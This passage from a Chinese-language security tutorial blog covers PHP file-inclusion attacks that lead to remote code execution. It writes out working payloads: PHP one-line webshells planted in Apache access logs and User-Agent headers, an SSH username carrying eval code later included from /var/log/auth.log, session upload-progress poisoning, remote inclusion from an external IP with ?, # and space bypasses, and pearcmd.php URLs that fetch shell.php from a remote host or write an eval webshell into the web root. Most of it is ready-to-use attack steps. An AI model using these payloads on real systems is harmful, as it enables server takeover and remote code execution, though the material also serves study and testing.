<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.2/api/&lt;?php 一句话木马?&gt;</span><br></pre></td></tr></table></figure>

<p>这时候再查看日志文件就会发现内容已经写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@aaa]#less /var/log/httpd/access_log</span><br><span class="line">192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] &quot;GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1&quot; 404 826....</span><br></pre></td></tr></table></figure>

<p>但是由于浏览器的URL编码功能，导致传入的代码不可用，所以我们可以通过bp抓包去进行写入，这也不会被浏览器进行URL编码</p>
<ul>
<li>UA头文件包含</li>
</ul>
<p>做法:</p>
<ul>
<li>传参访问日志文件目录(有时候需要目录穿越)</li>
<li>在UA头写入php代码，然后发送请求，并在日志文件中找到回显信息</li>
</ul>
<p>这里为什么要在UA头写恶意代码呢？是因为本地日志文件可以看到nginx服务器中记录的是每次请求user-agent报文，那么我们可以通过包含nginx’服务器的日志文件，然后在user-agent服务器中写入木马语句进行注入，这也可以避免有些时候对参数进行了关键字的过滤导致不能直接传马的情况</p>
<h3 id="SSH日志文件包含"><a href="#SSH日志文件包含" class="headerlink" title="SSH日志文件包含"></a>SSH日志文件包含</h3><p>利用条件：</p>
<ul>
<li>SSH日志路径已知，并且具有可读权限</li>
</ul>
<p>SSH日志文件的默认路径为<code>/var/log/auth.log</code></p>
<p><strong>Auth 日志文件</strong>：</p>
<ul>
<li><strong>位置</strong>：通常在 <code>/var/log/auth.log</code> 或 <code>/var/log/secure</code>。</li>
<li><strong>内容</strong>：记录了认证和授权相关的信息，比如登录成功、失败、密码尝试等。</li>
</ul>
<p>当我们发现一个本地文件包含漏洞时，可以把ssh连接的用户名写成webshell，然后包含&#x2F;var&#x2F;log&#x2F;auth.log获取服务器权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php eval($_GET[&#x27;k&#x27;]); ?&gt;&#x27;@172.18.101.100</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://192.168.1.1/?file=/var/log/auth.log&k=whoami%E5%8F%91%E7%8E%B0%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C">http://192.168.1.1?file=/var/log/auth.log&amp;k=whoami发现成功执行</a></p>
<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><h3 id="Session的工作原理"><a href="#Session的工作原理" class="headerlink" title="Session的工作原理"></a>Session的工作原理</h3><p>在PHP中，Session是用来保存用户数据的一种方式。当使用session_start()函数初始化Session时，PHP会在服务器上的特定路径下创建一个Session文件。这个路径可以在php.ini文件中通过<code>session.save_path</code>指定。Session文件通常以<code>sess_</code>为前缀，后面跟着一个Session ID。当用户再次访问网站时，服务器会通过这个Session ID来找到对应的Session文件，并加载其中的数据。</p>
<p>利用条件</p>
<p>session文件包含的利用条件有两个：</p>
<ul>
<li>Session的存储位置可以获取</li>
<li>Session的内容可控</li>
</ul>
<p>一般通过以下两种方式获取session的存储位置：</p>
<ul>
<li>通过phpinfo的信息获取session的存储位置。<br>通过phpinfo的信息获取<code>session.save_path</code></li>
<li>通过猜测默认的session存储位置进行尝试<br>通常Linux中的Session的默认存储位置在<code>/var/lib/php/session</code>目录下</li>
</ul>
<p>session常见存储路径:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line">session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。</span><br></pre></td></tr></table></figure>

<p>我们先看一下在php.ini中的几个关于session的配置</p>
<p><code>session.upload_progress.enabled = on</code></p>
<ul>
<li><strong>说明</strong>：启用上传进度功能。当设置为 <code>on</code> 时，PHP 将允许在文件上传过程中追踪进度。需要与其他相关配置一起使用。</li>
</ul>
<p><code>session.upload_progress.cleanup = on</code></p>
<ul>
<li><strong>说明</strong>：启用上传进度的清理功能。当设置为 <code>on</code> 时，PHP 会在上传完成后自动清理与上传进度相关的临时 Session 数据。这样可以防止过多的进度信息占用内存。</li>
</ul>
<p><code>session.upload_progress.prefix = &quot;upload_progress_&quot;</code></p>
<ul>
<li><strong>说明</strong>：设置上传进度 Session 变量的前缀。PHP 会创建一个以该前缀开头的 Session 变量来存储上传进度信息。默认情况下，上传进度变量的名称会是 <code>upload_progress_[session_id]</code> 的形式。</li>
</ul>
<p><code>session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code></p>
<ul>
<li><strong>说明</strong>：设置用于访问上传进度信息的 Session 变量的名称。默认情况下，这个名称是 <code>PHP_SESSION_UPLOAD_PROGRESS</code>，可以在 JavaScript 或其他客户端代码中使用该名称来获取上传进度。</li>
</ul>
<p><code>session.upload_progress.freq = &quot;1%&quot;</code></p>
<ul>
<li><strong>说明</strong>：设置上传进度更新的频率。该选项指定了上传进度的信息更新频率，值为 <code>1%</code> 表示每当上传进度达到 1% 时，PHP 会更新进度信息。可以设置为更高的比例，以减少 Session 的更新次数。</li>
</ul>
<p><code>session.upload_progress.min_freq = &quot;1&quot;</code></p>
<ul>
<li><strong>说明</strong>：设置更新进度信息的最小频率（以秒为单位）。设置为 <code>1</code> 表示每秒至少更新一次上传进度信息。此选项可以帮助控制频繁更新所带来的性能开销。</li>
</ul>
<p><strong><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中</strong> </p>
<h3 id="如何创建session文件呢。"><a href="#如何创建session文件呢。" class="headerlink" title="如何创建session文件呢。"></a>如何创建session文件呢。</h3><p>如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>但session还有一个默认选项，<code>session.use_strict_mode=Off</code>，这个配置决定了我们是否可以随意更改session，如果这个配置是打开的，比如，服务器端给的<code>PHPSESSID=wang</code>,此时我们<strong>在Cookie里更改PHPSESSID&#x3D;zhang</strong>，服务端那边是不会认的,生成的文件是sess_wang。但例如这个配置关闭的话，我们就可以抓包更改PHPSESSID&#x3D;zhang，此时在临时目录下就会生成sess_zhang临时文件。</p>
<p>同时上面也讲过了<strong>SESSION_UPLOAD_PROGRESS</strong>，既然session会被存储到临时文件中且又会往session文件中写入内容，那么如果我们能控制写入的内容，就能往目标主机上写马了，再配合文件包含漏洞就可以达到我们想要的效果。</p>
<p>事实上<strong>SESSION_UPLOAD_PROGRESS</strong>会把post的内容写入到session文件,通过控制post的内容即可写马</p>
<p>那么问题就来了,为什么不直接往session文件里面写马?因为虽然我们能控制session文件的名字,但是我们并不能控制它的内容,只能使用<strong>SESSION_UPLOAD_PROGRESS</strong>去实现.</p>
<p>如果存在本地文件包含漏洞，就可以通过传参写入恶意代码到Session文件当中去，然后通过文件包含漏洞执行rce</p>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a><strong>攻击步骤</strong></h3><ul>
<li>将恶意代码写入PHP_SESSION_UPLOAD_PROGRESS下</li>
<li>攻击者可以通过PHPinfo或者猜测到session存放的位置</li>
<li>通过开发者模式可以获得文件名称</li>
<li>通过本地文件包含漏洞可以解析session文件达到攻击的目的</li>
</ul>
<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要</p>
<p>如果session.upload_progress.cleanup被打开了,这就意味着<strong>SESSION_UPLOAD_PROGRESS</strong>往session中被写入的内容会被即时清除,这时候我们就需要利用利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</p>
<h2 id="无限制远程文件包含"><a href="#无限制远程文件包含" class="headerlink" title="无限制远程文件包含"></a>无限制远程文件包含</h2><p>无限制远程文件包含是指包含文件的位置并不在本地服务器，而是通过URL的形式包含到其他服务器上的文件，以及执行文件中的恶意代码</p>
<p>利用条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></figure>

<p>接下来我们看一下怎么实现的</p>
<p>首先在本地的web目录中创建一个php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在我们的云服务器上的web目录同样创建一个php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后进行远程包含</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?file=http://156.238.233.87/1.php</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250314174711424.png" alt="image-20250314174711424"></p>
<p>成功包含，如果把服务器中的文件后缀改成其他的也是一样可以当成php代码去执行的</p>
<h2 id="有限制远程文件包含"><a href="#有限制远程文件包含" class="headerlink" title="有限制远程文件包含"></a>有限制远程文件包含</h2><p>有限制的远程文件包含是代码中存在特定的前缀和后缀.php &#x2F;.html 等拓展名过滤的时候，攻击者需要绕过前缀或者拓展名过滤，才能远程执行URL代码</p>
<p>通常有限制的远程文件包含可以通过问号、井号、空格绕过</p>
<h3 id="通过问号绕过"><a href="#通过问号绕过" class="headerlink" title="通过问号绕过"></a>通过问号绕过</h3><p>可以在问号后面添加html字符串，问号后面的拓展名会被当做查询，从而绕过过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?file=http://156.238.233.87/1.php?</span><br></pre></td></tr></table></figure>

<h3 id="通过井号绕过"><a href="#通过井号绕过" class="headerlink" title="通过井号绕过"></a>通过井号绕过</h3><p>可以在#后面添加HTML字符串，#会截断后面的拓展名，从而绕过拓展名过滤.#的URL编码为%23</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?file=http://156.238.233.87/1.php%23</span><br></pre></td></tr></table></figure>

<h3 id="通过空格绕过"><a href="#通过空格绕过" class="headerlink" title="通过空格绕过"></a>通过空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.abc.com/file.php?filename=http://192.168.2.1/php.txt%20</span><br></pre></td></tr></table></figure>

<h2 id="利用pearcmd-php从LFI到getshell"><a href="#利用pearcmd-php从LFI到getshell" class="headerlink" title="利用pearcmd.php从LFI到getshell"></a>利用pearcmd.php从LFI到getshell</h2><p>条件:register_argc_argv&#x3D;On</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/71f52d2105a77d98bb8258abc734614c.png" alt="image-20211220194003580"></p>
<p>pear可以用来拉取远程的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install -R /tmp http://vps/shell.php</span><br></pre></td></tr></table></figure>

<p>假如我的vps上有一个文件shell.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果你远程服务器中&#x2F;var&#x2F;www&#x2F;html中php代码可以被解析，那么你使用pear拉取到的shell.php就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa</span><br></pre></td></tr></table></figure>

<p>如果远程服务器上的php没有被解析，拉取到的shell.php就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以，<strong>当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell。</strong></p>
<p>如果靶机出网</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们尝试拉取远程服务器的shell.php到靶机的&#x2F;tmp目录下</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span><br><span class="line">//shell就是我们的一句话木马</span><br></pre></td></tr></table></figure>

<p>然后文件包含shell.php同时传参cmd即可</p>
<p>解释payload</p>
<ul>
<li><strong><code>?file=/usr/local/lib/php/pearcmd.php</code></strong><ul>
<li>指定 <code>pearcmd.php</code> 文件的路径。</li>
<li><code>pearcmd.php</code> 是 PEAR（PHP 扩展和应用库）的命令行工具。</li>
</ul>
</li>
<li><strong><code>&amp;+install+-R+/tmp+http://vps/shell.php</code></strong><ul>
<li>这是 <code>pearcmd.php</code> 的 <code>install</code> 命令的参数。</li>
<li><code>install</code>：安装指定的包。</li>
<li><code>-R /tmp</code>：将安装的文件保存到 <code>/tmp</code> 目录。</li>
<li><code>http://vps/shell.php</code>：从远程服务器下载的恶意文件。</li>
</ul>
</li>
</ul>
<p>如果靶机不出网，我们可以写一句话木马进hello.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[&#x27;shell&#x27;]);?&gt;+/var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p>解释payload</p>
<ul>
<li><strong><code>?+config-create+</code></strong><ul>
<li>这是 PHP 的 <code>pearcmd.php</code> 工具的一个参数，用于创建配置文件。</li>
<li><code>pearcmd.php</code> 是 PEAR（PHP 扩展和应用库）的命令行工具。</li>
</ul>
</li>
<li><strong><code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/</code></strong><ul>
<li>指定 <code>pearcmd.php</code> 文件的路径。</li>
<li>如果服务器上存在 <code>pearcmd.php</code>，这段代码会尝试调用它。</li>
</ul>
</li>
<li><strong><code>&lt;?=eval($_POST[1])?&gt;</code></strong><ul>
<li>这是一个 PHP 短标签，用于执行 <code>eval($_POST[1])</code>。</li>
<li><code>eval</code> 函数会执行传入的 PHP 代码，<code>$_POST[1]</code> 是从 POST 请求中获取的参数。</li>
<li>这段代码的目的是将恶意 PHP 代码写入目标文件。</li>
</ul>
</li>
<li><strong><code>+/tmp/hello.php</code></strong><ul>
<li>指定目标文件的路径，即 <code>/tmp/hello.php</code>。</li>
<li>如果攻击成功，恶意代码会被写入该文件。</li>
</ul>
</li>
</ul>
<p>后来看了p牛的文章才知道<code>$SERVER</code>并不认为&amp;符号是参数的分隔符，而是将+号作为分隔符</p>
<p>注意:在传参的时候不能用hackbar，因为<code>&lt;</code>和<code>&gt;</code>会被hackbar编码而不会生效</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRCE"><span class="toc-number">1.</span> <span class="toc-text">什么是RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E7%B1%BB-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">分类(远程代码和远程命令)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">RCE漏洞产生的条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E7%BB%95%E8%BF%87bypass%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.</span> <span class="toc-text">RCE绕过bypass姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">php执行系统命令函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">4.2.</span> <span class="toc-text">绕过关键字黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.</span> <span class="toc-text">特殊命令替换绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4cat"><span class="toc-number">4.3.1.</span> <span class="toc-text">读文件命令cat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">4.4.</span> <span class="toc-text">空格的绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%A7%BF%E5%8A%BF"><span class="toc-number">5.</span> <span class="toc-text">RCE命令执行的姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">5.1.</span> <span class="toc-text">写入一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-number">5.2.</span> <span class="toc-text">短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">5.3.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eeval%E4%B8%AD%E6%9C%89echo%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">5.4.</span> <span class="toc-text">关于eval中有echo的限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E4%B8%AD%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.5.</span> <span class="toc-text">eval中无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">5.5.1.</span> <span class="toc-text">查看当前目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Alocaleconv-%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.1.1.</span> <span class="toc-text">方法一：localeconv()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Achr-46"><span class="toc-number">5.5.1.2.</span> <span class="toc-text">方法二：chr(46)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9Aphpversion-%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.1.3.</span> <span class="toc-text">方法三：phpversion()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9Acrypt-%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.1.4.</span> <span class="toc-text">方法四：crypt()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.2.</span> <span class="toc-text">读取当前目录文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%95%B0%E7%BB%84%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.2.1.</span> <span class="toc-text">操作数组的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.2.2.</span> <span class="toc-text">读取文件的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#end-%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.2.3.</span> <span class="toc-text">end()函数读取最后一个文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-reverse-%E5%87%BD%E6%95%B0%E7%BF%BB%E8%BD%AC%E6%95%B0%E7%BB%84"><span class="toc-number">5.5.2.4.</span> <span class="toc-text">array_reverse()函数翻转数组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#next-%E5%87%BD%E6%95%B0%E7%A7%BB%E5%8A%A8%E6%8C%87%E9%92%88"><span class="toc-number">5.5.2.5.</span> <span class="toc-text">next()函数移动指针</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E9%9D%9E%E7%AC%AC%E4%B8%80%E7%AC%AC%E4%BA%8C%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.3.</span> <span class="toc-text">读取非第一第二文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">5.5.4.</span> <span class="toc-text">查看上级目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Adirname-%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.4.1.</span> <span class="toc-text">方法一：dirname()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%9E%84%E9%80%A0"><span class="toc-number">5.5.4.2.</span> <span class="toc-text">方法二：构造..</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.5.</span> <span class="toc-text">读取上级目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%92%8C%E8%AF%BB%E5%8F%96%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.6.</span> <span class="toc-text">查看和读取根目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#glob%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.7.</span> <span class="toc-text">glob伪协议查看文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.5.8.</span> <span class="toc-text">利用session进行无参数RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RE"><span class="toc-number">5.5.9.</span> <span class="toc-text">利用请求头进行无参数RE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.5.10.</span> <span class="toc-text">利用全局变量进行无参数RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system%E4%B8%AD%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">5.6.</span> <span class="toc-text">system中无字母RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-bin%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.6.1.</span> <span class="toc-text">使用&#x2F;bin目录下的可执行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bashfuck%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">5.6.2.</span> <span class="toc-text">bashfuck实现无字母RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%BC%96%E7%A0%81%E6%89%A7%E8%A1%8CRCE"><span class="toc-number">5.6.2.1.</span> <span class="toc-text">数字编码执行RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-Bash-Shell%E7%9A%84Here-string%E8%AF%AD%E6%B3%95"><span class="toc-number">5.6.2.2.</span> <span class="toc-text">Linux Bash Shell的Here string语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0%E5%8F%98%E9%87%8F"><span class="toc-number">5.6.2.3.</span> <span class="toc-text">$0变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-0"><span class="toc-number">5.6.2.4.</span> <span class="toc-text">构造$0</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E5%9F%BA%E7%A1%80"><span class="toc-number">5.7.</span> <span class="toc-text">eval中无数字字母RCE(基础)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E%E6%9E%84%E9%80%A0"><span class="toc-number">5.7.1.</span> <span class="toc-text">自增构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%9E%84%E9%80%A0"><span class="toc-number">5.7.2.</span> <span class="toc-text">异或构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E6%9E%84%E9%80%A0"><span class="toc-number">5.7.3.</span> <span class="toc-text">取反构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%96%E6%9E%84%E9%80%A0"><span class="toc-number">5.7.4.</span> <span class="toc-text">或构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 